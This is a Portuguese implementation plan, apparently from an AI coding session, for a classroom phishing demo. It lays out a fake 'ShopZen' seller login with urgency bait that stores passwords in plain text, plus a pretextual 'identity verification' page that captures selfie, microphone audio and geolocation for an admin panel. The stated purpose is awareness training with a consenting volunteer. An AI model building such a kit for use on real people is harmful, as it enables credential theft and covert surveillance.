# Plano de Execucao - Demo de Phishing ShopZen

## Contexto

Demo educacional ao vivo pra Semana da Tecnologia do IFSP Birigui. Fluxo: Julio (voluntario) recebe link falso no WhatsApp, cai numa tela de login fake "ShopZen" (marca ficticia), digita credenciais (qualquer senha aceita), e e levado a uma tela de "verificacao de identidade" que pede permissoes de camera, localizacao e microfone sob pretextos. Tudo capturado e exibido depois num painel `/admin` pra revelacao e, ao final, apagado ao vivo.

Autorizacao institucional ja dada (professor orientador + IFSP). Escopo e so o Julio - nao ha divulgacao publica do link. Esse plano cobre a implementacao completa da aplicacao web descrita em `PLANEJAMENTO.md`.

Projeto comeca vazio (so tem `PLANEJAMENTO.md`). Stack: Node + Express, `node:sqlite` (nativo do Node, ja testado - funciona no Node v24 instalado, emite warning experimental que pode ser ignorado), armazenamento de uploads em pasta local.

Decisoes travadas nesta sessao (perguntas ja respondidas pelo usuario):
- Admin `/admin` protegido por senha fixa simples via variavel de ambiente (sem lib extra, comparacao direta de string - aceitavel pro escopo, nao e sistema de producao com dados sensiveis de terceiros).
- Modelo de dados: sessao por visita, identificada por `session_id` (UUID), permitindo ensaiar o fluxo varias vezes sem misturar capturas de rodadas antigas.
- Wipe no admin: deleta linhas do banco + arquivos em `uploads/`, mas mantem servidor no ar (nao reseta nada de infra, so dados).

## Estrutura de arquivos

```
phishing-demo/
  package.json
  .env.example
  .gitignore
  server.js                  # entrypoint Express
  src/
    db.js                    # setup node:sqlite, schema, helpers de query
    routes/
      login.js                # GET/POST fluxo de login
      verificacao.js           # GET pagina + POST endpoints de captura (foto/audio/geo)
      sucesso.js               # GET tela final
      admin.js                 # GET painel + POST wipe, protegido por auth
    middleware/
      adminAuth.js             # HTTP Basic Auth checando env var
    public/
      css/style.css            # identidade visual ShopZen
      js/login.js               # client JS da tela de login
      js/verificacao.js          # client JS: getUserMedia, geolocation, MediaRecorder
      img/ (vazio, logo e SVG inline, sem arquivo)
    views/
      login.html
      verificacao.html
      sucesso.html
      admin.html
  uploads/                     # fotos .jpg e audios .webm, criado em runtime
  uploads/.gitkeep
```

Sem framework de template engine (sem necessidade de dados dinamicos complexos no HTML) - paginas publicas (`login`, `verificacao`, `sucesso`) sao HTML estatico servido direto, com JS client-side fazendo fetch pros endpoints. Pagina `admin.html` e a unica que precisa de dados dinamicos (lista de capturas) - renderizar via template string simples no proprio `routes/admin.js` (sem lib de template, concatenar HTML e aceitavel pro escopo).

## Esquema do banco (SQLite via `node:sqlite`)

Tabela unica `capturas`:

```sql
CREATE TABLE IF NOT EXISTS capturas (
  session_id TEXT PRIMARY KEY,
  criado_em TEXT NOT NULL,
  email TEXT,
  senha TEXT,
  foto_path TEXT,
  audio_path TEXT,
  geo_lat REAL,
  geo_lon REAL,
  geo_accuracy REAL,
  ip TEXT,
  user_agent TEXT
);
```

`db.js` exporta:
- `getDb()` - abre/cria `database.sqlite` na raiz do projeto (ignorado no git).
- `criarSessao(sessionId)` - insert inicial com `criado_em`.
- `salvarLogin(sessionId, email, senha)` - update.
- `salvarFoto(sessionId, fotoPath)`, `salvarAudio(sessionId, audioPath)`, `salvarGeo(sessionId, lat, lon, accuracy)`, `salvarDispositivo(sessionId, ip, userAgent)` - updates pontuais.
- `listarCapturas()` - select * order by criado_em desc, pro admin.
- `wipeTudo()` - deleta todas as linhas da tabela (retorna lista de paths de arquivo pra quem chamar deletar do disco).

## Sessao do visitante (cookie)

Usar cookie simples `sid` (UUID v4, `crypto.randomUUID()`), setado no primeiro GET de `/` se nao existir, httpOnly, sem lib externa de sessao (nao precisa de `express-session` - so precisamos de um ID estavel por visita, sem dados de sessao em memoria do servidor). Middleware em `server.js`:

```js
app.use((req, res, next) => {
  let sid = req.cookies?.sid;
  if (!sid) {
    sid = crypto.randomUUID();
    res.cookie('sid', sid, { httpOnly: true });
  }
  req.sessionId = sid;
  next();
});
```

Precisa de `cookie-parser` (dependencia leve, padrao de mercado) - adicionar ao `package.json`.

## Rotas e comportamento

### `GET /`
Serve `views/login.html` (arquivo estatico).

### `POST /login`
Body: `{ email, senha }` (JSON, via fetch).
- Garante que existe linha em `capturas` pro `sessionId` (chama `criarSessao` se nao existir, senao so atualiza).
- Captura `req.ip` e `req.headers['user-agent']`, salva via `salvarDispositivo`.
- Salva email/senha em texto puro via `salvarLogin` (requisito do PLANEJAMENTO: exibir pro Julio na revelacao).
- Sempre aceita (nao valida senha nenhuma, so exige campos nao vazios).
- Responde `{ ok: true, redirect: '/verificacao' }`.

### `GET /verificacao`
Serve `views/verificacao.html`.

### `POST /verificacao/foto`
Recebe foto como base64 (JSON `{ imagemBase64 }`) vinda de captura via `<canvas>` no client.
- Decodifica base64, salva em `uploads/<sessionId>.jpg`.
- Chama `salvarFoto(sessionId, 'uploads/<sessionId>.jpg')`.
- Responde `{ ok: true }`.

### `POST /verificacao/audio`
Recebe audio como `multipart/form-data` (Blob do MediaRecorder) - usar `multer` (dependencia padrao pra upload de arquivo em Express, simples e testada) configurado com `diskStorage` salvando direto em `uploads/<sessionId>.webm`.
- Chama `salvarAudio(sessionId, 'uploads/<sessionId>.webm')`.
- Responde `{ ok: true }`.

### `POST /verificacao/geo`
Body JSON `{ lat, lon, accuracy }`.
- Chama `salvarGeo`.
- Responde `{ ok: true }`.

### `GET /sucesso`
Serve `views/sucesso.html` - mensagem de "verificacao concluida com sucesso", visual ShopZen, sem acao nenhuma de captura.

### `GET /admin`
Protegido por `middleware/adminAuth.js` (HTTP Basic Auth, usuario fixo `admin`, senha de `process.env.ADMIN_PASSWORD`, comparacao direta de string - sem hash, aceitavel pro escopo/ambiente local de uma demo).
- Busca `listarCapturas()`.
- Renderiza HTML com: tabela de sessoes (data/hora, email, senha, device/IP), card por sessao com foto (`<img>`), audio (`<audio controls>`), mapa de localizacao (iframe OpenStreetMap com `lat,lon` na URL - sem API key necessaria, formato `https://www.openstreetmap.org/export/embed.html?bbox=...&marker=lat,lon`).
- Botao "Apagar tudo" que faz `POST /admin/wipe`.

### `POST /admin/wipe`
Tambem protegido por `adminAuth`.
- Chama `wipeTudo()` do db (deleta linhas, retorna lista de `foto_path`/`audio_path`).
- Deleta cada arquivo retornado via `fs.unlink` (ignorar erro se arquivo nao existir).
- Redireciona de volta pra `/admin` (ou responde `{ ok: true }` se for fetch - usar fetch + reload da pagina no client).

## Identidade visual ShopZen (`public/css/style.css`)

Paleta fixada no PLANEJAMENTO:
- Fundo `#FFFFFF`, campos/divisorias `#F5F6F8`, texto `#1F2430`.
- Accent verde-esmeralda `#10B981` - so em botoes, links, logo.

Logo: wordmark "ShopZen" bold + icone geometrico (quadrado verde com "Z" branco dentro ou sacola estilizada), tudo SVG inline dentro do HTML (sem arquivo de imagem externo) - repetir o mesmo bloco de logo em `login.html`, `verificacao.html`, `sucesso.html`, `admin.html` pra manter consistencia de marca.

Layout: card central (max-width ~400px), sombra leve, cantos arredondados, inputs com `background: #F5F6F8`, botao primario verde-esmeralda.

## Telas - conteudo especifico

### `login.html`
- Logo ShopZen no topo.
- Titulo "Identificamos um problema no seu produto anunciado" (eco da isca do WhatsApp) + texto "Sua conta de vendedor sera suspensa em 24h. Entre para regularizar."
- Form: campo email, campo senha, botao verde "Entrar".
- Client JS (`login.js`): no submit, `fetch('/login', { method: 'POST', body: JSON.stringify({email, senha}) })`, no sucesso `window.location.href = '/verificacao'`.

### `verificacao.html`
- Logo ShopZen.
- Titulo "Verificacao de identidade" + texto "Para sua seguranca, confirme que e voce."
- Sequencia de 3 passos visiveis na UI (stepper simples: Camera -> Localizacao -> Microfone), cada passo com botao proprio que dispara o prompt nativo do navegador:
  1. "Tirar selfie" -> `navigator.mediaDevices.getUserMedia({video:true})`, desenha frame num `<canvas>` escondido depois de ~1s de preview, `canvas.toDataURL('image/jpeg', 0.8)`, POST pra `/verificacao/foto`, para o stream de video.
  2. "Confirmar localizacao" -> `navigator.geolocation.getCurrentPosition(...)`, POST pra `/verificacao/geo`.
  3. "Verificar microfone" -> `getUserMedia({audio:true})`, `MediaRecorder` gravando ~4s (parar automatico via `setTimeout`), ao parar monta `Blob` e envia via `FormData` pra `/verificacao/audio`, para o stream de audio.
- So libera "Concluir verificacao" (navega pra `/sucesso`) depois que os 3 passos completarem (desabilitar botao final até todos resolverem, dar feedback visual de check verde por passo).
- Tratar erro de permissao negada (usuario clica "bloquear"): mostrar mensagem simples e permitir tentar de novo (nao travar o fluxo da demo se Julio recusar por engano).

### `sucesso.html`
- Logo ShopZen, icone de check verde, "Verificacao concluida com sucesso!", texto "Sua conta esta segura. Obrigado por confirmar sua identidade."

### `admin.html` (gerado via template string em `routes/admin.js`)
- Cabecalho com botao vermelho "Apagar tudo" (com `confirm()` client-side antes de disparar o POST, pra evitar clique acidental ao vivo).
- Lista de sessoes capturadas, cada card mostrando: data/hora, email, senha (texto puro, destacado), foto, audio player, mapa embed com a geolocalizacao, IP + user-agent.
- Se nao houver capturas: estado vazio "Nenhuma captura ainda".

## Dependencias (`package.json`)

```json
{
  "name": "phishing-demo",
  "version": "1.0.0",
  "private": true,
  "type": "commonjs",
  "scripts": {
    "start": "node server.js"
  },
  "dependencies": {
    "express": "^4.21.0",
    "cookie-parser": "^1.4.6",
    "multer": "^1.4.5-lts.1"
  }
}
```

Nao usar `node:sqlite` com import que precise de flag experimental explicita se possivel; se o Node exigir `--experimental-sqlite` (ja testado nesta sessao: **nao precisou**, so emitiu warning), documentar isso no README caso a versao do Node mude.

`.env.example`:
```
ADMIN_PASSWORD=troque_essa_senha
PORT=3000
```

Carregar env sem lib extra (`process.env`, documentar que quem rodar precisa exportar `ADMIN_PASSWORD` ou criar `.env` e usar `node --env-file=.env server.js` - recurso nativo do Node 20+, evita dependencia de `dotenv`).

`.gitignore`:
```
node_modules/
database.sqlite
uploads/*
!uploads/.gitkeep
.env
```

## Seguranca/robustez minima (sem over-engineering)

- Validar que `email` e `senha` nao sao vazios antes de salvar (UX, nao seguranca real - propositalmente nao validamos credenciais pois demo aceita qualquer senha).
- Limitar tamanho do upload de audio/foto via `multer` (`limits: { fileSize: 10 * 1024 * 1024 }`) e checar tamanho do base64 da foto manualmente antes de decodificar, só pra não deixar o processo aceitar payload absurdo durante a demo.
- Sanitizar `sessionId` usado em nome de arquivo: como e gerado via `crypto.randomUUID()` no servidor (nunca vindo direto de input do client sem validacao), e seguro usar direto no path - mas adicionar um regex check (`/^[0-9a-f-]{36}$/`) antes de montar qualquer path de arquivo, por seguranca basica.
- Rotas `/admin` e `/admin/wipe`: aplicar `adminAuth` middleware nas duas.

## Verificacao end-to-end (pos-implementacao)

1. `npm install`.
2. Criar `.env` a partir de `.env.example` com senha de admin.
3. `node --env-file=.env server.js`, confirmar log "Servidor rodando em http://localhost:3000".
4. Abrir `http://localhost:3000` no Chrome (requisito de contexto seguro pra permissions - `localhost` conta como seguro).
5. Preencher login com email/senha quaisquer, confirmar redirect pra `/verificacao`.
6. Passar pelos 3 passos de permissao (camera, localizacao, microfone), confirmar que navegador pede cada permissao e que a UI mostra check em cada passo.
7. Confirmar redirect pra `/sucesso` so depois dos 3 passos completos.
8. Abrir `http://localhost:3000/admin` (digitar usuario `admin` + senha do `.env` no prompt do navegador), confirmar que a sessao aparece com email/senha em texto puro, foto visivel, audio tocavel, mapa mostrando localizacao real da maquina.
9. Clicar "Apagar tudo", confirmar que a lista fica vazia e que os arquivos em `uploads/` foram removidos (`ls uploads/`).
10. Repetir passos 5-7 numa segunda aba/sessao pra confirmar que sessoes diferentes (`sid` diferente) nao se misturam no admin.

## Fora de escopo (nao implementar)

- HTTPS self-signed pro celular do Julio (PLANEJAMENTO deixa como decisao de logistica, nao bloqueia o site) - abordagem padrao e abrir no laptop em `localhost` e espelhar no projetor.
- Qualquer dado alem do que PLANEJAMENTO.md especifica (nao adicionar analytics, nao adicionar rastreamento alem do definido).
- Autenticacao robusta multi-usuario no admin (so Rafael opera, senha unica basta).
